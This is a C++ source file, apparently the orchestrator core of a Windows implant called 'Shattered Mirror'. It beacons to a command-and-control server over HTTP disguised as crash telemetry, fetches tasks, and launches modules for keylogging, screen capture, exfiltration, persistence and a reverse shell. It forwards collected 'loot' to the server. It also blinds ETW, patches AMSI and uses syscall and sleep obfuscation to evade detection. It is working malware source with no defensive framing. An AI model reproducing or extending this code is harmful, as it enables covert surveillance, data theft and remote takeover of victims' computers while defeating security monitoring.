/*=============================================================================
 * Shattered Mirror v1 — Orchestrator: Atom Manager Core
 *
 * The brain of the Orchestrator. 
 * Manages the lifecycle of Atoms and their inter-process communication.
 * Provides detailed verification and logging for every action.
 *===========================================================================*/

#include "AtomManager.h"
#include "Config.h"
#include "Logger.h"
#include "../Evasion_Suite/include/indirect_syscall.h"
#include "../Evasion_Suite/include/stack_encrypt.h"
#include "../Evasion_Suite/include/etw_blind.h"
#include "../Atoms/Atom_08_Proc.h"
#include "../Atoms/Atom_02_Key.h"
#include "../Atoms/Atom_06_Screen.h"
#include "../Atoms/Atom_10_Shell.h"
#include "../Atoms/Atom_01_Net.h"
#include "../Atoms/Atom_03_Sys.h"
#include "../Atoms/Atom_04_AMSI.h"
#include "../Atoms/Atom_05_Exfil.h"
#include "../Atoms/Atom_07_Persist.h"
#include "../Atoms/Atom_09_FileSys.h"
#include <cstdio>
#include <string>
#include <vector>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

extern SYSCALL_TABLE g_SyscallTable;

/* Global Session Encryption Key for IPC */
static BYTE s_SessionKey[16] = { 0 };

/* Forward declaration for IPC Listener */
DWORD WINAPI IpcListenerThread(LPVOID lpParam);

/* Atom Registry */
static ATOM_RECORD s_Atoms[MAX_ATOMS] = { 0 };
static DWORD       s_dwAtomCount      = 0;

/* External AMSI bypass trigger */
extern BOOL InstallAMSIBypass(void);

/*---------------------------------------------------------------------------
 *  C2 Interaction Implementation (Production Grade)
 *-------------------------------------------------------------------------*/

BOOL SendHeartbeat() {
    Logger::Log(NETWORK, "Transmitting pulse to C2 listener...");
    
    WCHAR wDomain[256] = { 0 };
    MultiByteToWideChar(CP_ACP, 0, Config::C2_DOMAIN, -1, wDomain, 256);

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return Logger::Verify("WinHttpOpen", false, "Error Code: " + std::to_string(GetLastError()));

    HINTERNET hConnect = WinHttpConnect(hSession, wDomain, (INTERNET_PORT)Config::C2_PORT, 0);
    if (!hConnect) { 
        DWORD err = GetLastError();
        WinHttpCloseHandle(hSession); 
        return Logger::Verify("WinHttpConnect", false, "Error Code: " + std::to_string(err)); 
    }

    /* SSL/TLS Settings Mismatch FIX: Use HTTP if not configured for SECURE */
    DWORD dwFlags = (Config::C2_PORT == 443) ? WINHTTP_FLAG_SECURE : 0;
    // --- FIX: Ensure POST is used and point to the unified telemetry endpoint ---
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v2/telemetry", NULL, NULL, NULL, dwFlags);
    if (!hRequest) { 
        DWORD err = GetLastError();
        WinHttpCloseHandle(hConnect); 
        WinHttpCloseHandle(hSession); 
        return Logger::Verify("WinHttpOpenRequest", false, "Error Code: " + std::to_string(err)); 
    }

    /* Inject dynamic PSK ID */
    std::wstring headers = L"Content-Type: application/json\r\nX-Telemetry-ID: " + std::wstring(Config::PSK_ID, Config::PSK_ID + strlen(Config::PSK_ID)) + L"\r\n";
    
    std::string body = "{\"report_id\":\"user_crash_01\",\"diagnostic_blob\":\"heartbeat\"}";

    BOOL bRes = WinHttpSendRequest(hRequest, headers.c_str(), -1, (LPVOID)body.c_str(), (DWORD)body.length(), (DWORD)body.length(), 0);
    if (bRes) {
        WinHttpReceiveResponse(hRequest, NULL);
        Logger::Log(SUCCESS, "Heartbeat Established. Signal Locked.");
    } else {
        Logger::Log(ERROR_LOG, "Heartbeat Send Failure. Error: " + std::to_string(GetLastError()));
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return bRes;
}

std::string FetchTask() {
    // Heartbeat fetching is now silent to reduce console spam. 
    // Logs will only appear if we catch a valid task.
    
    WCHAR wDomain[256] = { 0 };
    MultiByteToWideChar(CP_ACP, 0, Config::C2_DOMAIN, -1, wDomain, 256);

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return "";

    HINTERNET hConnect = WinHttpConnect(hSession, wDomain, (INTERNET_PORT)Config::C2_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return ""; }

    DWORD dwFlags = (Config::C2_PORT == 443) ? WINHTTP_FLAG_SECURE : 0;
    // --- FIX: Ensure POST is used to match Shattered Console routes ---
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v2/telemetry", NULL, NULL, NULL, dwFlags);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return ""; }

    /* Inject dynamic PSK ID for authentication */
    std::wstring headers = L"X-Telemetry-ID: " + std::wstring(Config::PSK_ID, Config::PSK_ID + strlen(Config::PSK_ID)) + L"\r\n";
    WinHttpAddRequestHeaders(hRequest, headers.c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD);

    // --- FIX: Heartbeat and Tasking unified to POST to match console logic ---
    std::string body = "{\"report_id\":\"beacon\",\"diagnostic_blob\":\"checkin\"}";
    BOOL bRes = WinHttpSendRequest(hRequest, headers.c_str(), -1, (LPVOID)body.c_str(), (DWORD)body.length(), (DWORD)body.length(), 0);
    std::string result = "";

    if (bRes && WinHttpReceiveResponse(hRequest, NULL)) {
        // --- FIX: Check for 200 OK specifically to avoid interpreting 405/404 as tasks ---
        DWORD dwStatusCode = 0;
        DWORD dwHeaderSize = sizeof(dwStatusCode);
        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, 
                            WINHTTP_HEADER_NAME_BY_INDEX, &dwStatusCode, &dwHeaderSize, WINHTTP_NO_HEADER_INDEX);

        if (dwStatusCode != 200) {
            // Log issues silently in background log, don't spam console
        } else {
            Logger::Log(SUCCESS, "C2 Link Synchronized. No pending tasking.");
            DWORD dwSize = 0;
            WinHttpQueryDataAvailable(hRequest, &dwSize);
            if (dwSize > 0) {
                char* pBuf = new char[dwSize + 1];
                DWORD dwRead = 0;
                if (WinHttpReadData(hRequest, pBuf, dwSize, &dwRead)) {
                    pBuf[dwRead] = '\0';
                    result = pBuf;
                    Logger::Log(SUCCESS, "Received task payload: " + result);
                }
                delete[] pBuf;
            } else {
                // Silent on empty queue
            }
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return result;
}

void SendTaskResult(std::string result) {
    Logger::Log(INFO, "Reporting task execution result to C2...");
    
    WCHAR wDomain[256] = { 0 };
    MultiByteToWideChar(CP_ACP, 0, Config::C2_DOMAIN, -1, wDomain, 256);

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, wDomain, (INTERNET_PORT)Config::C2_PORT, 0);
    
    DWORD dwFlags = (Config::C2_PORT == 443) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v2/telemetry", NULL, NULL, NULL, dwFlags);

    std::wstring headers = L"Content-Type: application/json\r\nX-Telemetry-ID: " + std::wstring(Config::PSK_ID, Config::PSK_ID + strlen(Config::PSK_ID)) + L"\r\n";
    std::string body = "{\"report_id\":\"task_result_01\",\"diagnostic_blob\":\"" + result + "\"}";
    
    WinHttpSendRequest(hRequest, headers.c_str(), -1, (LPVOID)body.c_str(), (DWORD)body.length(), (DWORD)body.length(), 0);
    WinHttpReceiveResponse(hRequest, NULL);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

BOOL SpawnAtomFromTask(std::string json) {
    Logger::Log(ATOM_EVENT, "Parsing incoming task for Atom injection...");
    
    int atom_id = 0;
    std::string payload = "";

    // Quick parse for atom_id and payload
    size_t id_pos = json.find("\"atom_id\":");
    if (id_pos != std::string::npos) atom_id = std::stoi(json.substr(id_pos + 10));

    size_t pay_pos = json.find("\"payload\":\"");
    if (pay_pos != std::string::npos) {
        size_t end_pos = json.find("\"", pay_pos + 11);
        if (end_pos != std::string::npos) payload = json.substr(pay_pos + 11, end_pos - (pay_pos + 11));
    }

    if (atom_id <= 0 || atom_id > MAX_ATOMS) return false;

    /* Check if Atom is already established */
    if (s_Atoms[atom_id].Status != ATOM_STATUS_RUNNING) {
        Logger::Log(SUCCESS, "Initiating ATOM " + std::to_string(atom_id) + " Deployment...");
        
        s_Atoms[atom_id].dwAtomId = (DWORD)atom_id;
        s_Atoms[atom_id].Status = ATOM_STATUS_STARTING;
        
        HANDLE hThread = NULL;
        switch (atom_id) {
            case 1:  hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)NetworkAtomMain, (LPVOID)(ULONG_PTR)atom_id, 0, NULL); break;
            case 2:  hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeyloggerAtomMain, (LPVOID)(ULONG_PTR)atom_id, 0, NULL); break;
            case 3:  hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SystemInfoAtomMain, (LPVOID)(ULONG_PTR)atom_id, 0, NULL); break;
            case 4:  hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AMSIBypassAtomMain, (LPVOID)(ULONG_PTR)atom_id, 0, NULL); break;
            case 5:  hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExfiltrationAtomMain, (LPVOID)(ULONG_PTR)atom_id, 0, NULL); break;
            case 6:  hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ScreenCaptureAtomMain, (LPVOID)(ULONG_PTR)atom_id, 0, NULL); break;
            case 7:  hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PersistenceAtomMain, (LPVOID)(ULONG_PTR)atom_id, 0, NULL); break;
            case 8:  hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ProcessAtomMain, (LPVOID)(ULONG_PTR)atom_id, 0, NULL); break;
            case 9:  hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)FileSystemAtomMain, (LPVOID)(ULONG_PTR)atom_id, 0, NULL); break;
            case 10: hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReverseShellAtomMain, (LPVOID)(ULONG_PTR)atom_id, 0, NULL); break;
        }

        if (hThread) {
            Logger::Log(INFO, "Telemetry bridge established for Atom " + std::to_string(atom_id));
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)IpcListenerThread, (LPVOID)(ULONG_PTR)atom_id, 0, NULL);
            
            /* Wait up to 5s for the bridge to come online */
            int timeout = 50;
            while (s_Atoms[atom_id].Status != ATOM_STATUS_RUNNING && timeout-- > 0) Sleep(100);
        }
    }

    /* Send command payload to the Atom via pipe */
    if (s_Atoms[atom_id].Status == ATOM_STATUS_RUNNING && !payload.empty()) {
        IPC_MESSAGE msg = { 0 };
        msg.CommandId = CMD_EXECUTE;
        msg.dwPayloadLen = (DWORD)payload.length();
        if (msg.dwPayloadLen > MAX_IPC_PAYLOAD_SIZE) msg.dwPayloadLen = MAX_IPC_PAYLOAD_SIZE;
        memcpy(msg.Payload, payload.c_str(), msg.dwPayloadLen);

        Logger::Log(INFO, "Dispatching task payload to ATOM " + std::to_string(atom_id));
        return IPC_SendMessage(s_Atoms[atom_id].hPipe, &msg, s_SessionKey, 16);
    }

    return (s_Atoms[atom_id].Status == ATOM_STATUS_RUNNING);
}

DWORD WINAPI IpcListenerThread(LPVOID lpParam) {
    DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
    HANDLE hPipe = IPC_CreateServerPipe(dwAtomId);
    if (!hPipe) {
        Logger::Log(ERROR_LOG, "IPC Bridge Fault: Could not create pipe for Atom " + std::to_string(dwAtomId));
        s_Atoms[dwAtomId].Status = ATOM_STATUS_DEAD;
        return 1;
    }

    ConnectNamedPipe(hPipe, NULL);
    s_Atoms[dwAtomId].hPipe = hPipe;
    s_Atoms[dwAtomId].Status = ATOM_STATUS_RUNNING;
    s_Atoms[dwAtomId].dwLastHeartbeat = GetTickCount();
    
    Logger::Log(SUCCESS, "IPC Bridge ONLINE for Atom " + std::to_string(dwAtomId));

    while (s_Atoms[dwAtomId].Status == ATOM_STATUS_RUNNING) {
        IPC_MESSAGE msg = { 0 };
        if (IPC_ReceiveMessage(hPipe, &msg, s_SessionKey, 16)) {
            s_Atoms[dwAtomId].dwLastHeartbeat = GetTickCount();
            if (msg.CommandId == CMD_REPORT) {
                std::string loot((char*)msg.Payload, msg.dwPayloadLen);
                SendTaskResult(loot);
            } else if (msg.CommandId == CMD_HEARTBEAT) {
                // Heartbeat updated automatically by receive
            }
        } else if (GetLastError() == ERROR_BROKEN_PIPE) {
            break;
        }
        Sleep(50); 
    }

    Logger::Log(ERROR_LOG, "IPC Link SEVERED for Atom " + std::to_string(dwAtomId));
    s_Atoms[dwAtomId].Status = ATOM_STATUS_DEAD;
    CloseHandle(hPipe);
    return 0;
}

/*---------------------------------------------------------------------------
 *  InitAtomManager
 *-------------------------------------------------------------------------*/
BOOL InitAtomManager(void) {
    Logger::Log(INFO, "Initializing Orchestrator subsystems...");
    
    if (!Logger::Verify("Syscall Table Init", InitSyscallTable(&g_SyscallTable))) return FALSE;

    if (Config::ENABLE_ETW_BLIND) {
        Logger::Log(INFO, "Blinding Event Tracing for Windows (ETW)...");
        BlindETW(&g_SyscallTable);
    }

    if (Config::ENABLE_AMSI_BYPASS) {
        Logger::Log(INFO, "Patching AMSI.dll to bypass memory scans...");
        InstallAMSIBypass();
    }

    // Synchronize IPC session encryption key from the builder's configuration
    memcpy(s_SessionKey, Config::PSK_ID, 16); 
    Logger::Log(SUCCESS, "IPC Session encryption key mapped from config.");

    for (int i = 0; i < MAX_ATOMS; i++) {
        s_Atoms[i].Status = ATOM_STATUS_UNINITIALIZED;
    }
    s_dwAtomCount = 0;

    return TRUE;
}

/*---------------------------------------------------------------------------
 *  OrchestratorMain — Main Loop
 *-------------------------------------------------------------------------*/
DWORD WINAPI OrchestratorMain(LPVOID lpParam) {
    /* Initialize logging safely outside of DllMain */
    Logger::Init(Config::LOG_FILE_PATH, Config::ENABLE_DEBUG_CONSOLE);
    Logger::Log(INFO, "--- SHATTERED MIRROR: ORCHESTRATOR ONLINE ---");

    if (!InitAtomManager()) {
        Logger::Log(ERROR_LOG, "Crushing Orchestrator due to initialization failure.");
        Logger::Shutdown();
        return 1;
    }

    SendHeartbeat();

    std::string taskJson;
    while (TRUE) {
        /* Obfuscated Sleep using Stack Encryption */
        SLEEP_CONFIG sleepCfg = { 0 };
        sleepCfg.dwSleepMs = 15000;
        sleepCfg.bStackSpoof = Config::ENABLE_STACK_SPOOF;
        
        /* FIX: Corrected initialization order to prevent crash */
        sleepCfg.pImplantBase = GetModuleHandleW(NULL); 
        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)sleepCfg.pImplantBase;
        PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((BYTE*)sleepCfg.pImplantBase + pDos->e_lfanew);
        sleepCfg.szImplantSize = pNt->OptionalHeader.SizeOfImage;
        
        Logger::Log(INFO, "Entering Obfuscated Sleep (15s)... Signal masked.");
        ObfuscatedSleep(&sleepCfg, &g_SyscallTable);

        taskJson = FetchTask();
        if (!taskJson.empty() && taskJson != "NO_TASK") {
            Logger::Log(SUCCESS, "Received dynamic tasking from C2.");
            if (taskJson.find('{') != std::string::npos) {
                if (SpawnAtomFromTask(taskJson)) {
                    SendTaskResult("Atom Injected Successfully.");
                }
            }
        }

        /* Verify Health of Active Atoms */
        for (int i = 0; i < MAX_ATOMS; i++) {
            if (s_Atoms[i].Status == ATOM_STATUS_RUNNING) {
                DWORD dwAvail = 0;
                if (PeekNamedPipe(s_Atoms[i].hPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
                    IPC_MESSAGE msg = { 0 };
                    if (IPC_ReceiveMessage(s_Atoms[i].hPipe, &msg, s_SessionKey, sizeof(s_SessionKey))) {
                        if (msg.CommandId == CMD_HEARTBEAT) s_Atoms[i].dwLastHeartbeat = GetTickCount();
                    }
                }

                if ((GetTickCount() - s_Atoms[i].dwLastHeartbeat) > 120000) {
                    Logger::Log(ERROR_LOG, "Atom heartbeat TIMEOUT. Atom assumed DEAD.");
                    s_Atoms[i].Status = ATOM_STATUS_DEAD;
                    CloseHandle(s_Atoms[i].hPipe);
                }
            }
        }
    }

    Logger::Shutdown();
    return 0;
}
